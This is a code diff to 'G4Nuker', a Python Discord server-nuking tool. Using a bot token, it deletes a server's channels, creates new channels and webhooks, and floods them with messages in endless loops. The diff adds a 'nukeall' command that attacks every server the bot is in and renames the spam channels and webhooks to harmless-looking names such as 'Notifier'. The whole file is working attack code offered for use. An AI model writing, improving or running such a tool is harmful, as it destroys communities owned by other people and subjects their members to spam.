@@ -3,6 +3,7 @@ import re
 import requests
 import time
 import base64
+import threading as threadlib
 from concurrent.futures import ThreadPoolExecutor
 import sys
 
@@ -59,6 +60,11 @@ class console:
             self.ERROR: co.error,
         }
    
+    def skibidiprint(self, first, text='No text provided'):
+        level = self.INFO
+        color = self.levelcolors.get(level, co.main)
+        print(f'{co.main}[{co.reset}{first}{co.main}] {co.reset}»{co.reset} {co.main}[{color}{text}{co.main}]{co.reset}')
+
     def log(self, level=INFO, text='No text provided', extra=''):
         watermark = ''
         color = self.levelcolors.get(level, co.main)
@@ -99,17 +105,6 @@ class console:
                 centeredlines.append(' ' * padding + line)
         
         return '\n'.join(centeredlines)
-
-    def printbar(self, tokens, proxies):
-        bar = fr'{co.main}«{tokens}» Tokens                   «{proxies}» Proxies'
-
-        bar = self.center(text=bar, size=os.get_terminal_size().columns)
-        bar = str(bar)
-
-        for char in ['»', '«']:
-            bar = bar.replace(char, f'{co.main}{char}{co.reset}')
-
-        print(bar)
 
     def printbanner(self):
         banner = fr'''{co.main}
@@ -213,19 +208,6 @@ class console:
         self.printbanner()
         if self.module != None:
             self.title(f'G4Nuker - {self.module} - g4tools.top - discord.gg/spamming - Made by r3ci')
-
-    def createmenu(self, options):
-        toprint = []
-        for i, option in enumerate(options, 1):
-            number = str(i).zfill(2)
-            toprint.append(f'{co.main}[{co.reset}{number}{co.main}] » {co.main}[{co.reset}{option}{co.main}]')
-        
-        print('\n'.join(toprint))
-
-    def printcustommenu(self, options):
-        options = dict(options)
-        self.prep()
-        self.createmenu(list(options.keys()) + ['Back'])
 console=console('G4Nuker')
 
 class G4nuker:
@@ -374,12 +356,12 @@ class G4nuker:
                     time.sleep(retry)
 
                 else:
-                    console.log(console.ERROR, f'Failed to get channels error={r.text}')
+                    console.log(console.ERROR, f'Failed to get channels serverid={self.serverid} error={r.text}')
                     self.channels = []
                     break
 
             except Exception as e:
-                console.log(console.ERROR, f'Error getting channels error={e}')
+                console.log(console.ERROR, f'Error getting channels serverid={self.serverid} error={e}')
                 self.channels = []
                 break
 
@@ -396,20 +378,20 @@ class G4nuker:
                         headers={'Authorization': f'Bot {self.token}'}
                     )
                     if r.status_code in (200, 204):
-                        console.log(console.SUCCESS, f'Deleted name={name} type={type}')
+                        console.log(console.SUCCESS, f'Deleted name={name} type={type} serverid={self.serverid}')
                         break
 
                     elif r.status_code == 429:
                         retry = r.json().get('retry_after', 1)
-                        console.log(console.WARNING, f'Rate limited for {retry}s while deleting name={name} type={type}')
+                        console.log(console.WARNING, f'Rate limited for {retry}s while deleting name={name} type={type} serverid={self.serverid}')
                         time.sleep(retry)
 
                     else:
-                        console.log(console.ERROR, f'Failed to delete name={name} type={type} error={r.text}')
+                        console.log(console.ERROR, f'Failed to delete name={name} type={type} serverid={self.serverid} error={r.text}')
                         break
 
                 except Exception as e:
-                    console.log(console.ERROR, f'Error deleting name={name} type={type} error={e}')
+                    console.log(console.ERROR, f'Error deleting name={name} type={type} serverid={self.serverid} error={e}')
                     break
 
     def getroles(self):
@@ -432,12 +414,12 @@ class G4nuker:
                     time.sleep(retry)
 
                 else:
-                    console.log(console.ERROR, f'Failed to get roles error={r.text}')
+                    console.log(console.ERROR, f'Failed to get roles serverid={self.serverid} error={r.text}')
                     self.roles = []
                     break
 
             except Exception as e:
-                console.log(console.ERROR, f'Error getting roles error={e}')
+                console.log(console.ERROR, f'Error getting roles serverid={self.serverid} error={e}')
                 self.roles = []
                 break
 
@@ -453,63 +435,21 @@ class G4nuker:
                         headers={'Authorization': f'Bot {self.token}'}
                     )
                     if r.status_code in (200, 204):
-                        console.log(console.SUCCESS, f'Deleted role name={name}')
+                        console.log(console.SUCCESS, f'Deleted role name={name} serverid={self.serverid}')
                         break
 
                     elif r.status_code == 429:
                         retry = r.json().get('retry_after', 1)
-                        console.log(console.WARNING, f'Rate limited for {retry}s while deleting role name={name}')
+                        console.log(console.WARNING, f'Rate limited for {retry}s while deleting role name={name} serverid={self.serverid}')
                         time.sleep(retry)
 
                     else:
-                        console.log(console.ERROR, f'Failed to delete role name={name} error={r.text}')
+                        console.log(console.ERROR, f'Failed to delete role name={name} serverid={self.serverid} error={r.text}')
                         break
 
                 except Exception as e:
-                    console.log(console.ERROR, f'Error deleting role name={name} error={e}')
+                    console.log(console.ERROR, f'Error deleting role name={name} serverid={self.serverid} error={e}')
                     break
-
-    def changeserverinfo(self):
-        newname = 'github.com/r3ci/g4nuker'
-        iconurl = 'https://i.imgur.com/dovl3R3.png'
-        bannerurl = 'https://i.imgur.com/J35ZYZk.pngs'
-
-        def encodeimage(url):
-            r = requests.get(url)
-            if r.status_code == 200:
-                return 'data:image/png;base64,' + base64.b64encode(r.content).decode()
-            return None
-
-        payload = {'name': newname}
-        payload['icon'] = encodeimage(iconurl) if iconurl else None
-        payload['banner'] = encodeimage(bannerurl) if bannerurl else None
-
-        while True:
-            try:
-                r = requests.patch(
-                    f'https://discord.com/api/v9/guilds/{self.serverid}',
-                    headers={
-                        'Authorization': f'Bot {self.token}',
-                        'Content-Type': 'application/json'
-                    },
-                    json=payload
-                )
-                if r.status_code == 200:
-                    console.log(console.SUCCESS, 'Server info updated')
-                    break
-
-                elif r.status_code == 429:
-                    retry = r.json().get('retry_after', 1)
-                    console.log(console.WARNING, f'Rate limited for {retry}s while updating server info')
-                    time.sleep(retry)
-
-                else:
-                    console.log(console.ERROR, f'Failed to update server info error={r.text}')
-                    break
-
-            except Exception as e:
-                console.log(console.ERROR, f'Error updating server info error={e}')
-                break
 
     def createchannels(self, _):
         while len(self.channelscreated) < 10:
@@ -517,13 +457,13 @@ class G4nuker:
                 r = requests.post(
                     f'https://discord.com/api/v9/guilds/{self.serverid}/channels',
                     headers={'Authorization': f'Bot {self.token}', 'Content-Type': 'application/json'},
-                    json={'name': 'discord-gg-spamming', 'type': 0}
+                    json={'name': 'notification', 'type': 0}
                 )
                 if r.status_code == 201:
                     ch = r.json()
                     self.channelscreated.append({'id': ch['id'], 'name': ch['name'], 'type': ch['type']})
                     self.channels.append({'id': ch['id'], 'name': ch['name'], 'type': ch['type']})
-                    console.log(console.SUCCESS, f'Created channel name=discord-gg-spamming')
+                    console.log(console.SUCCESS, f'Created channel serverid={self.serverid}')
 
                 elif r.status_code == 429:
                     retry = r.json().get('retry_after', 1)
@@ -531,11 +471,36 @@ class G4nuker:
                     time.sleep(retry)
 
                 else:
-                    console.log(console.ERROR, f'Failed to create channel error={r.text}')
+                    console.log(console.ERROR, f'Failed to create channel serverid={self.serverid} error={r.text}')
                     break
 
             except Exception as e:
-                console.log(console.ERROR, f'Error creating channel error={e}')
+                console.log(console.ERROR, f'Error creating channel serverid={self.serverid} error={e}')
+                break
+
+    def leave(self, serverid):
+        while True:
+            try:
+                r = requests.delete(
+                    f'https://discord.com/api/v9/users/@me/guilds/{serverid}',
+                    headers={'Authorization': f'Bot {self.token}', 'Content-Type': 'application/json'},
+                    json={'name': 'Notifier'}
+                )
+                if r.status_code == 204:
+                    console.log(console.SUCCESS, f'Left server serverid={serverid}')
+                    break
+
+                elif r.status_code == 429:
+                    retry = r.json().get('retry_after', 1)
+                    console.log(console.WARNING, f'Rate limited for {retry}s while leaving server serverid={serverid}')
+                    time.sleep(retry)
+
+                else:
+                    console.log(console.ERROR, f'Failed to leave server serverid={serverid} error={r.text}')
+                    break
+
+            except Exception as e:
+                console.log(console.ERROR, f'Error leaving server serverid={serverid} error={e}')
                 break
 
     def createwebhooks(self, channel):
@@ -544,57 +509,80 @@ class G4nuker:
                 r = requests.post(
                     f'https://discord.com/api/v9/channels/{channel["id"]}/webhooks',
                     headers={'Authorization': f'Bot {self.token}', 'Content-Type': 'application/json'},
-                    json={'name': 'github.com/r3ci/g4nuker'}
+                    json={'name': 'Notifier'}
                 )
                 if r.status_code == 200 or r.status_code == 201:
                     hook = r.json()
                     self.webhooks.append({'id': hook['id'], 'token': hook['token'], 'channel_id': channel['id']})
-                    console.log(console.SUCCESS, f'Created webhook channel_id={channel["id"]}')
+                    console.log(console.SUCCESS, f'Created webhook channelid={channel["id"]} serverid={self.serverid}')
                     break
 
                 elif r.status_code == 429:
                     retry = r.json().get('retry_after', 1)
-                    console.log(console.WARNING, f'Rate limited for {retry}s while creating webhook channel_id={channel["id"]}')
+                    console.log(console.WARNING, f'Rate limited for {retry}s while creating webhook channelid={channel["id"]} serverid={self.serverid}')
                     time.sleep(retry)
 
                 else:
-                    console.log(console.ERROR, f'Failed to create webhook channel_id={channel["id"]} error={r.text}')
+                    console.log(console.ERROR, f'Failed to create webhook channelid={channel["id"]} serverid={self.serverid} error={r.text}')
                     break
 
             except Exception as e:
-                console.log(console.ERROR, f'Error creating webhook channel_id={channel["id"]} error={e}')
+                console.log(console.ERROR, f'Error creating webhook channelid={channel["id"]} serverid={self.serverid} error={e}')
                 break
 
     def spamwebhook(self, hook):
+        with open('message.txt', 'r') as f:
+            message = f.read()
         while True:
             try:
                 r = requests.post(
                     f'https://discord.com/api/v9/webhooks/{hook["id"]}/{hook["token"]}',
-                    json={'content': '''
-@everyone 
-# https://has.cash/r3ci 
-# https://github.com/r3ci/g4nuker
-# https://discord.gg/spamming
-# https://g4tools.top     
-https://media.discordapp.net/attachments/1336489247229608007/1346253810456330270/caption.gif?ex=689090d0&is=688f3f50&hm=582875dd73b0bd6494d3bfc0e7c281d7fe7de555b8fe5ca7a4ea4a8b5b126eb2&format=webp&animated=true
-https://media.discordapp.net/attachments/1106849767029477429/1114248605952397363/Zrzut_ekranu_2023-06-02_194601.gif?ex=68904921&is=688ef7a1&hm=23f231d77cd45d48d71ef30c0661e51b7bb954d8dd0b1a5327f752543dc0dd9c&=
-'''}
+                    json={'content': message}
                 )
                 if r.status_code in (200, 204):
-                    console.log(console.SUCCESS, f'Spammed webhook id={hook["id"]}')
+                    console.log(console.SUCCESS, f'Spammed webhookid={hook["id"]} serverid={self.serverid}')
 
                 elif r.status_code == 429:
                     retry = r.json().get('retry_after', 1)
-                    console.log(console.WARNING, f'Rate limited {retry}s while spamming webhook id={hook["id"]}')
+                    console.log(console.WARNING, f'Rate limited {retry}s while spamming webhookid={hook["id"]} serverid={self.serverid}')
                     time.sleep(retry)
 
                 else:
-                    console.log(console.ERROR, f'Failed to spam webhook id={hook["id"]} error={r.text}')
+                    console.log(console.ERROR, f'Failed to spam webhookid={hook["id"]} serverid={self.serverid} error={r.text}')
                     break
 
             except Exception as e:
-                console.log(console.ERROR, f'Error spamming webhook id={hook["id"]} error={e}')
+                console.log(console.ERROR, f'Error spamming webhookid={hook["id"]} serverid={self.serverid} error={e}')
                 break
+
+def nukke(serverid, issingle):
+    g4nuker = G4nuker(token)
+    g4nuker.serverid = serverid
+
+    #g4nuker.getroles()
+    #console.log(console.INFO, f'Found {len(g4nuker.roles)} roles, deleting them now!')
+    #with ThreadPoolExecutor(max_workers=20) as executor:
+    #    executor.map(lambda _: g4nuker.deleteroles(), range(len(g4nuker.roles)))
+
+    maxwork = 20 if issingle else 1
+    g4nuker.getchannels()
+    #console.log(console.INFO, f'Found {len(g4nuker.channels)} channels, deleting them now!')
+    with ThreadPoolExecutor(max_workers=maxwork) as executor:
+        executor.map(lambda _: g4nuker.deletechannels(), range(len(g4nuker.channels)))
+
+    maxwork = 10 if issingle else 1
+    with ThreadPoolExecutor(max_workers=maxwork) as executor:
+        executor.map(g4nuker.createchannels, range(10))
+    #console.log(console.INFO, f'Created {len(g4nuker.channels)} channels')
+
+    maxwork = 20 if issingle else 1
+    with ThreadPoolExecutor(max_workers=maxwork) as executor:
+        executor.map(g4nuker.createwebhooks, g4nuker.channels)
+    #console.log(console.INFO, f'Created {len(g4nuker.webhooks)} webhooks')
+
+    maxwork = len(g4nuker.webhooks) if issingle else 1
+    with ThreadPoolExecutor(max_workers=maxwork ) as executor:
+        executor.map(g4nuker.spamwebhook, g4nuker.webhooks)
 
 while True:
     console.cls()
@@ -602,61 +590,59 @@ while True:
     console.printbanner()
     console.log(console.INFO, 'Made by r3ci, make sure to start the github repository!')
     console.log(console.INFO, 'g4tools.top | discord.gg/spamming | github.com/r3ci')
-    token = console.input('Bot Token', str)
+    with open('bottoken.txt', 'r') as f:
+        token = f.read()
+
     g4nuker = G4nuker(token)
-
     invitelink = g4nuker.generateinvite()
-    console.log(console.INFO, f'Bot invite link » {invitelink}')
-
-    servers = g4nuker.getservers()
-    if servers != 'skip':
-        if not servers:
-            console.log(console.ERROR, 'The bot is NOT in any servers! Pleas add it using the bot link provided and run again')
-            input('')
-            sys.exit()
-
-        for server in servers:
-            print('')
-            console.log(console.INFO, f'ID » {server["id"]}')
-            console.log(console.INFO, f'Name » {server["name"]}')
-            console.log(console.INFO, f'Permissions » {", ".join(server["permissions"])}')
-        g4nuker.serverid = console.input('Server ID', str)
-
-    print('')
-    inserver, servername = g4nuker.isinserver()
-    while not inserver:
-        console.log(console.INFO, 'The bot is NOT inside of the server! Add it using this link')
+    while True:
         console.log(console.INFO, f'Bot invite link » {invitelink}')
-        console.log(console.INFO, 'Enter to continue')
+        print('\n')
+        console.skibidiprint('servers', 'Print out all of the servers the bot is in')
+        console.skibidiprint('leave', 'Leave a server by serverid')
+        console.skibidiprint('nuke', 'Nuke a server by serverid')
+        console.skibidiprint('leaveall', 'Leave a server by serverid')
+        console.skibidiprint('nukeall', 'Nuke all servers that the bot is in')
+        print('')
+
+
+        command = console.input('Command', str)
+        if command == 'servers':
+            servers = g4nuker.getservers()
+            for server in servers:
+                console.log(console.INFO, f'{server["name"]} » {server["id"]}')
+
+        elif command == 'leave':
+            serverid = console.input('Server ID', int)
+            g4nuker.leave(serverid)
+
+        elif command == 'nuke':
+            serverid = console.input('Server ID', int)
+            g4nuker.nukke(serverid, True)
+
+        elif command == 'leaveall':
+            servers = g4nuker.getservers()
+            for server in servers:
+                g4nuker.leave(server["id"])
+
+        elif command == 'nukeall':
+            threads = []
+            servers = g4nuker.getservers()
+            console.log(console.INFO, 'Yes im aware it might be bit slow but otherwise CPU usage would be way too high')
+            time.sleep(2.5)
+            for server in servers:
+                t = threadlib.Thread(target=nukke, args=(server["id"], False, ))
+                t.start()
+                threads.append(t)
+            
+            for t in threads:
+                t.join()
+
+        print('\n')
+        console.log(console.INFO, 'Finished! Enter to continue')
         input('')
-        inserver, servername = g4nuker.isinserver()
-
-    console.log(console.INFO, f'Ready to nuke {servername}!')
-    console.log(console.INFO, 'Enter to start nuking')
-    input('')
-
-    g4nuker.changeserverinfo()
-
-    g4nuker.getroles()
-    console.log(console.INFO, f'Found {len(g4nuker.roles)} roles, deleting them now!')
-    with ThreadPoolExecutor(max_workers=20) as executor:
-        executor.map(lambda _: g4nuker.deleteroles(), range(len(g4nuker.roles)))
-
-    g4nuker.getchannels()
-    console.log(console.INFO, f'Found {len(g4nuker.channels)} channels, deleting them now!')
-    with ThreadPoolExecutor(max_workers=20) as executor:
-        executor.map(lambda _: g4nuker.deletechannels(), range(len(g4nuker.channels)))
-
-    with ThreadPoolExecutor(max_workers=10) as executor:
-        executor.map(g4nuker.createchannels, range(10))
-    console.log(console.INFO, f'Created {len(g4nuker.channels)} channels')
-
-    with ThreadPoolExecutor(max_workers=20) as executor:
-        executor.map(g4nuker.createwebhooks, g4nuker.channels)
-    console.log(console.INFO, f'Created {len(g4nuker.webhooks)} webhooks')
-
-    with ThreadPoolExecutor(max_workers=len(g4nuker.webhooks)) as executor:
-        executor.map(g4nuker.spamwebhook, g4nuker.webhooks)
-
-    console.log(console.INFO, 'Finished! Enter to continue')
-    input('')
+        console.cls()
+        console.title('G4Nuker - g4tools.top - discord.gg/spamming - Made by r3ci')
+        console.printbanner()
+        console.log(console.INFO, 'Made by r3ci, make sure to start the github repository!')
+        console.log(console.INFO, 'g4tools.top | discord.gg/spamming | github.com/r3ci')
